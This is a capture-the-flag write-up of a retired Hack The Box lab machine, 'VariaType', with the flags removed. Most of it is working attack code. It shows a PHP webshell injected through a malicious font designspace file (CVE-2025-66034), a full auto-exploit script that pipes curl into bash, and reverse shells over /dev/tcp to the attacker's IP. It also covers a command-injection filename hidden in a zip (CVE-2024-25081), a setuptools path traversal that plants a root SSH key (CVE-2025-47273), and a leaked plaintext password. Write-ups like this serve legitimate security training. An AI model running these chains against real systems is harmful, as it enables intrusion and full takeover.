
# VariaType

> Retired Hack The Box machine. Public copy with flags removed. Authorized lab use only.

Nmap

```
Command: nmap -A --top-port 10000 10.129.198.82 --min-rate 1000
```

```
Output:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-15 12:27 -0400
Nmap scan report for 10.129.198.82
Host is up (0.056s latency).
Not shown: 8378 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)
|_  256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://variatype.htb/
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   54.95 ms 10.10.14.1
2   55.79 ms 10.129.198.82

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.68 seconds

```

Fuzz to discover directory or subdomain and I found one subdomain

```
Command: ffuf -u http://variatype.htb -H "Host: FUZZ.variatype.htb" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200
```

```
Output Found:

portal                  [Status: 200, Size: 2494, Words: 445, Lines: 59, Duration: 66ms]
:: Progress: [4750/4750] :: Job [1/1] :: 722 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```


Go to the webpage of variatype.htb and access to services portal, it see the web allow us to upload files such as file .designspace and file .tff and go to portal.variatype.htb and found the login page



And, search for vulnerable of variable font on google and found CVE-2025-66034

And here is the github that I have found:

```
https://github.com/advisories/GHSA-768j-98cg-p3fv
```

Here is the POC script to get two file of .tff

```
#!/usr/bin/env python3
import os

from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

def create_source_font(filename, weight=400):
    fb = FontBuilder(unitsPerEm=1000, isTTF=True)
    fb.setupGlyphOrder([".notdef"])
    fb.setupCharacterMap({})
    
    pen = TTGlyphPen(None)
    pen.moveTo((0, 0))
    pen.lineTo((500, 0))
    pen.lineTo((500, 500))
    pen.lineTo((0, 500))
    pen.closePath()
    
    fb.setupGlyf({".notdef": pen.glyph()})
    fb.setupHorizontalMetrics({".notdef": (500, 0)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupOS2(usWeightClass=weight)
    fb.setupPost()
    fb.setupNameTable({"familyName": "Test", "styleName": f"Weight{weight}"})
    fb.save(filename)

if __name__ == '__main__':
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    create_source_font("source-light.ttf", weight=100)
    create_source_font("source-regular.ttf", weight=400)
```

And here is the payload of malicious file .designspace

```
cat > revshell.designspace << 'EOF'
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.70/4444 0>&1'"); ?>]]]]><![CDATA[>]]></labelname>
    </axis>
  </axes>
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="MyFont" filename="shell.php">
      <axis-subsets><axis-subset name="Weight"/></axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
EOF
```


Use git-dumper and found credential

```
Command:

git-dumper http://portal.variatype.htb/.git ./variatype-git


```

Find the log of the git

```
Command: cd variatype-git/
Command: git log --oneline
```
``
```
Output:

753b5f5 (HEAD -> master) fix: add gitbot user for automated validation pipeline 5030e79 feat: initial portal implementation
```

Inspect the changes in each commit

```
Command: git show 753b5f5
```

```
Output:

commit 753b5f5957f2020480a19bf29a0ebc80267a4a3d (HEAD -> master) Author: Dev Team <[dev@variatype.htb](mailto:dev@variatype.htb)> Date: Fri Dec 5 15:59:33 2025 -0500     fix: add gitbot user for automated validation pipeline diff --git a/auth.php b/auth.php index 615e621..b328305 100644 --- a/auth.php +++ b/auth.php @@ -1,3 +1,5 @@  <?php  session_start(); -$USERS = []; +$USERS = [

- 'gitbot' => 'G1tB0t_Acc3ss_2025!' +];
```

```
Username:gitbot, Password:G1tB0t_Acc3ss_2025
```

After I have this credential, I can login to 

```
portal.variatype.htb 
```

And successfully and has a dashboard

This is what I have done before but it not successfully but it will good credential after get user shell

```
# Flask CWD is likely something like /var/www/variatype or /opt/variatype
# Portal PHP root is likely /var/www/portal or /opt/portal
# Try writing directly using absolute paths

for path in \
  "/var/www/portal/shell.php" \
  "/var/www/html/portal/shell.php" \
  "/opt/portal/shell.php" \
  "/opt/variatype/portal/shell.php" \
  "/var/www/variatype.htb/portal/shell.php"; do

cat > abs.designspace << DSEOF
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[<?php system(\$_GET['cmd']); ?>]]]]><![CDATA[>]]></labelname>
    </axis>
  </axes>
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="MyFont" filename="${path}">
      <axis-subsets><axis-subset name="Weight"/></axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
DSEOF

  echo -n "[*] Trying $path → "
  curl -s -X POST http://variatype.htb/tools/variable-font-generator/process \
    -F "designspace=@abs.designspace" \
    -F "masters=@source-light.ttf" \
    -F "masters=@source-regular.ttf" | grep -o "Success\|Processing completed\|failed"

  result=$(curl -s "http://portal.variatype.htb/shell.php?cmd=id" 2>/dev/null)
  if echo "$result" | grep -q "uid="; then
    echo "[!!!] SHELL FOUND at /shell.php"
    echo "$result"
    break
  fi
done
```

This is a bash script that I try to automate and found the hint for user shell

```
Output:
┌──(kali㉿kali)-[~/HTB/VariaType] └─$ ./solve.sh  
[_] Trying /var/www/portal/shell.php → [_] Trying /var/www/html/portal/shell.php → [_] Trying /opt/portal/shell.php → [_] Trying /opt/variatype/portal/shell.php → Success Processing completed [*] Trying /var/www/variatype.htb/portal/shell.php → ┌──(kali㉿kali)-[~/HTB/VariaType] └─$

┌──(kali㉿kali)-[~/HTB/VariaType] └─$ curl -v "http://variatype.htb/download/qr1_tDaYH2A" 2>&1 | grep -i "content-disposition|filename|location|x-" < Content-Disposition: attachment; filename=MyVariableFont_qr1_tDaYH2A.ttf
```

```
The important path file is: /opt/variatype/portal/
```

Test many time but still not trigger for reverse shell:

```
cat writeonly.designspace                                                                     
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[<?php file_put_contents('/opt/variatype/portal/cmd.php','<?php system($_GET[chr(99).chr(109).chr(100)]); ?>'); ?>]]]]><![CDATA[>]]></labelname>
    </axis>
  </axes>
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="MyFont" filename="/opt/variatype/portal/dashboard.php">
      <axis-subsets><axis-subset name="Weight"/></axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>

curl -s -X POST http://variatype.htb/tools/variable-font-generator/process \                  
  -F "designspace=@writeonly.designspace" \
  -F "masters=@source-light.ttf" \
  -F "masters=@source-regular.ttf" | grep -o "completed\|failed"
  
curl -s -X POST http://portal.variatype.htb \                                                 
  -d "username=gitbot&password=G1tB0t_Acc3ss_2025!" \
  -c fresh_cookies.txt > /dev/null
  
curl -s "http://portal.variatype.htb/dashboard.php" -b fresh_cookies.txt


```

After this I write a script for trigger:

```
#!/bin/bash
# VariaType HTB - CVE-2025-66034 Full Auto Exploit
# Usage: ./pwn.sh <LHOST>

LHOST=${1:-"10.10.14.70"}
LPORT="4444"
TARGET="http://variatype.htb"
PORTAL="http://portal.variatype.htb"
SHELL_PATH="/var/www/portal.variatype.htb/public/files/shell.php"
SHELL_URL="$PORTAL/files/shell.php"

echo "[*] VariaType CVE-2025-66034 Auto Exploit"
echo "[*] LHOST: $LHOST | LPORT: $LPORT"

# Step 1 - Create rev.sh payload
echo "[*] Creating reverse shell payload..."
cat > /tmp/rev.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
EOF

# Step 2 - Create malicious designspace
echo "[*] Creating malicious designspace..."
cat > /tmp/malicious.designspace << EOF
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[<?php system(\$_GET['cmd']); ?>]]]]><![CDATA[>]]></labelname>
    </axis>
  </axes>
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="MyFont" filename="$SHELL_PATH">
      <axis-subsets><axis-subset name="Weight"/></axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
EOF

# Step 3 - Upload malicious designspace
echo "[*] Uploading payload via CVE-2025-66034..."
RESULT=$(curl -s -X POST $TARGET/tools/variable-font-generator/process \
  -F "designspace=@/tmp/malicious.designspace" \
  -F "masters=@source-light.ttf" \
  -F "masters=@source-regular.ttf" | grep -o "completed\|failed")

echo "[*] Upload result: $RESULT"

# Step 4 - Start Python HTTP server to serve rev.sh
echo "[*] Starting HTTP server on port 8080 to serve rev.sh..."
cd /tmp && python3 -m http.server 8080 &
HTTP_PID=$!
sleep 1

# Step 5 - Start netcat listener in background info
echo ""
echo "========================================"
echo "[!] START YOUR LISTENER NOW:"
echo "    nc -lvnp $LPORT"
echo "========================================"
echo ""
read -p "[*] Press Enter once listener is ready..."

# Step 6 - Trigger shell via web shell - curl+pipe to bash
echo "[*] Triggering reverse shell..."
ENCODED_CMD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('curl http://$LHOST:8080/rev.sh|bash'))")
curl -s "$SHELL_URL?cmd=$ENCODED_CMD" &

echo "[*] Payload sent! Check your listener."
echo "[*] If no shell, try: curl '$SHELL_URL?cmd=id'"

# Cleanup
sleep 5
kill $HTTP_PID 2>/dev/null
```


```
chmod +x pwn.sh

# Terminal 1 - listener
nc -lvnp 4444

# Terminal 2 - exploit
./pwn.sh 10.10.14.70
```

And got a reverse shell

```
┌──(kali㉿kali)-[~/HTB/VariaType]
└─$ nc -lvnp 4444                                                                                 
listening on [any] 4444 ...
connect to [10.10.14.70] from (UNKNOWN) [10.129.148.10] 46880
bash: cannot set terminal process group (3558): Inappropriate ioctl for device
bash: no job control in this shell
www-data@variatype:~/portal.variatype.htb/public/files$ 

```

As we test before before trigger it vuln to /opt/ location, so search for listing files in this directory

```
find /opt -type f 2>/dev/null
```

Output:
```
/opt/variatype/portal/generated/shell.php
/opt/variatype/portal/fonts/shell.php
/opt/variatype/portal/static/shell.php
/opt/variatype/portal/view.php
/opt/variatype/portal/uploads/shell.php
/opt/variatype/portal/public/shell.php
/opt/variatype/portal/web/shell.php
/opt/variatype/portal/www/shell.php
/opt/variatype/portal/dashboard.php
/opt/variatype/portal/archive/shell.php
/opt/variatype/portal/files/shell.php
/opt/variatype/portal/html/shell.php
/opt/variatype/portal/output/shell.php
/opt/variatype/templates/index.html
/opt/variatype/templates/services.html
/opt/variatype/templates/success.html
/opt/variatype/templates/tools/success.html
/opt/variatype/templates/tools/variable_font_generator.html
/opt/variatype/templates/home.html
/opt/variatype/templates/upload.html
/opt/variatype/templates/base.html
/opt/font-tools/install_validator.py
/opt/process_client_submissions.bak

```

Find the interesting file:

```
Command: cat /opt/process_client_submissions.bak
```

```
Output:

#!/bin/bash # # Variatype Font Processing Pipeline # Author: Steve Rodriguez <steve@variatype.htb> # Only accepts filenames with letters, digits, dots, hyphens, and underscores. # set -euo pipefail UPLOAD_DIR="/var/www/portal.variatype.htb/public/files" PROCESSED_DIR="/home/steve/processed_fonts" QUARANTINE_DIR="/home/steve/quarantine" LOG_FILE="/home/steve/logs/font_pipeline.log" mkdir -p "$PROCESSED_DIR" "$QUARANTINE_DIR" "$(dirname "$LOG_FILE")" log() { echo "[$(date --iso-8601=seconds)] $*" >> "$LOG_FILE" } cd "$UPLOAD_DIR" || { log "ERROR: Failed to enter upload directory"; exit 1; } shopt -s nullglob EXTENSIONS=( "*.ttf" "*.otf" "*.woff" "*.woff2" "*.zip" "*.tar" "*.tar.gz" "*.sfd" ) SAFE_NAME_REGEX='^[a-zA-Z0-9._-]+$' found_any=0 for ext in "${EXTENSIONS[@]}"; do for file in $ext; do found_any=1 [[ -f "$file" ]] || continue [[ -s "$file" ]] || { log "SKIP (empty): $file"; continue; } # Enforce strict naming policy if [[ ! "$file" =~ $SAFE_NAME_REGEX ]]; then log "QUARANTINE: Filename contains invalid characters: $file" mv "$file" "$QUARANTINE_DIR/" 2>/dev/null || true continue fi log "Processing submission: $file" if timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c " import fontforge import sys try: font = fontforge.open('$file') family = getattr(font, 'familyname', 'Unknown') style = getattr(font, 'fontname', 'Default') print(f'INFO: Loaded {family} ({style})', file=sys.stderr) font.close() except Exception as e: print(f'ERROR: Failed to process $file: {e}', file=sys.stderr) sys.exit(1) "; then log "SUCCESS: Validated $file" else log "WARNING: FontForge reported issues with $file" fi mv "$file" "$PROCESSED_DIR/" 2>/dev/null || log "WARNING: Could not move $file" done done if [[ $found_any -eq 0 ]]; then log "No eligible submissions found." fi
```

And let claude.ai, it vulnerable to CVE-2024-25081

Here is the guide step by step for privlege escalation to user steve

```
Step1: Create a zip file exploit

# Encode reverse shell payload
PAYLOAD=$(echo "bash -i >& /dev/tcp/10.10.14.70/5555 0>&1" | base64 -w0)
echo "Payload: $PAYLOAD"

# Create malicious filename with base64 encoded revshell
MALICIOUS_NAME="\$(echo ${PAYLOAD}|base64 -d|bash).ttf"

# Create a dummy TTF file
cp source-light.ttf /tmp/dummy.ttf

# Create ZIP with malicious filename
cd /tmp
python3 -c "
import zipfile
payload = '$(echo "bash -i >& /dev/tcp/10.10.14.70/5555 0>&1" | base64 -w0)'
filename = f'\$(echo {payload}|base64 -d|bash).ttf'
print(f'[*] Malicious filename: {filename}')
with zipfile.ZipFile('exploit.zip', 'w') as z:
    z.write('dummy.ttf', filename)
print('[+] exploit.zip created')
"

ls -la /tmp/exploit.zip


Step2: Serve and deliver to target

# Kali - Terminal 1: new listener for steve
nc -lvnp 5555

# Kali - Terminal 2: serve exploit.zip
cd /tmp && python3 -m http.server 8080


# On target www-data shell:
cd /var/www/portal.variatype.htb/public/files
curl http://10.10.14.70:8080/exploit.zip -o exploit.zip
ls -la exploit.zip
```


And got the shell of user steve 

```
──(kali㉿kali)-[/tmp]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.14.70] from (UNKNOWN) [10.129.148.10] 45202
bash: cannot set terminal process group (10499): Inappropriate ioctl for device
bash: no job control in this shell

```

Find the user.txt

```
steve@variatype:/tmp/ffarchive-10500-1$ cd
cd
steve@variatype:~$ ls
ls
bin
logs
processed_fonts
quarantine
user.txt
steve@variatype:~$ cat user.txt 
cat user.txt
[user flag removed]
```


Now, it time to privilege to root

First command that I always try is: 

```
sudo -l
```

And here is the output:

```
steve@variatype:~$ sudo -l
sudo -l
Matching Defaults entries for steve on variatype:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

Read the content of that file

```
steve@variatype:~$ cat /opt/font-tools/install_validator.py
cat /opt/font-tools/install_validator.py
#!/usr/bin/env python3
"""
Font Validator Plugin Installer
--------------------------------
Allows typography operators to install validation plugins
developed by external designers. These plugins must be simple
Python modules containing a validate_font() function.

Example usage:
  sudo /opt/font-tools/install_validator.py https://designer.example.com/plugins/woff2-check.py
"""

import os
import sys
import re
import logging
from urllib.parse import urlparse
from setuptools.package_index import PackageIndex

# Configuration
PLUGIN_DIR = "/opt/font-tools/validators"
LOG_FILE = "/var/log/font-validator-install.log"

# Set up logging
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme in ('http', 'https'), result.netloc])
    except Exception:
        return False

def install_validator_plugin(plugin_url):
    if not os.path.exists(PLUGIN_DIR):
        os.makedirs(PLUGIN_DIR, mode=0o755)

    logging.info(f"Attempting to install plugin from: {plugin_url}")

    index = PackageIndex()
    try:
        downloaded_path = index.download(plugin_url, PLUGIN_DIR)
        logging.info(f"Plugin installed at: {downloaded_path}")
        print("[+] Plugin installed successfully.")
    except Exception as e:
        logging.error(f"Failed to install plugin: {e}")
        print(f"[-] Error: {e}")
        sys.exit(1)

def main():
    if len(sys.argv) != 2:
        print("Usage: sudo /opt/font-tools/install_validator.py <PLUGIN_URL>")
        print("Example: sudo /opt/font-tools/install_validator.py https://internal.example.com/plugins/glyph-check.py")
        sys.exit(1)

    plugin_url = sys.argv[1]

    if not is_valid_url(plugin_url):
        print("[-] Invalid URL. Must start with http:// or https://")
        sys.exit(1)

    if plugin_url.count('/') > 10:
        print("[-] Suspiciously long URL. Aborting.")
        sys.exit(1)

    install_validator_plugin(plugin_url)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script must be run as root (use sudo).")
        sys.exit(1)
    main()
steve@variatype:~$ 

```

Ask claude.ai to analyze it again

exploit CVE-2025-47273 (setuptools path traversal) to write our SSH key as root

So now it time for exploit:

```
On kali
Step 1: Generate SSH key

ssh-keygen -t ed25519 -f /tmp/rootkey -N ""
cat /tmp/rootkey.pub

Step 2: Set up the mailcious HTTP server

mkdir -p /tmp/sshpayload
cp /tmp/rootkey.pub /tmp/sshpayload/authorized_keys

cat > /tmp/evil_server.py << 'EOF'
#!/usr/bin/env python3
import socket

PUBKEY = open("/tmp/rootkey.pub", "rb").read()

def handle(conn):
    req = b""
    while b"\r\n\r\n" not in req:
        req += conn.recv(1024)
    print(f"[+] Request received")
    response = (
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: application/octet-stream\r\n"
        b"Content-Length: " + str(len(PUBKEY)).encode() + b"\r\n"
        b"Connection: close\r\n"
        b"\r\n" + PUBKEY
    )
    conn.sendall(response)
    conn.close()
    print("[+] Key served!")

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(("0.0.0.0", 8888))
server.listen(5)
print("[*] Listening on :8888")
while True:
    conn, addr = server.accept()
    print(f"[+] Connection from {addr}")
    handle(conn)
EOF

python3 /tmp/evil_server.py

On victim machine
Step3: Trigger

# URL-encoded path traversal: %2F = /
# This writes to /root/.ssh/authorized_keys
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  "http://10.10.14.70:8888/%2Froot%2F.ssh%2Fauthorized_keys"
  
On kali
Step4:

ssh -i /tmp/rootkey root@10.129.148.10
```


And got a root shell and find the root.txt

```
root@variatype:~# cat root.txt 
[root flag removed]
```


Here is a link that I use claude.ai to help identify the vulnerability:

```
[private research reference removed]
```
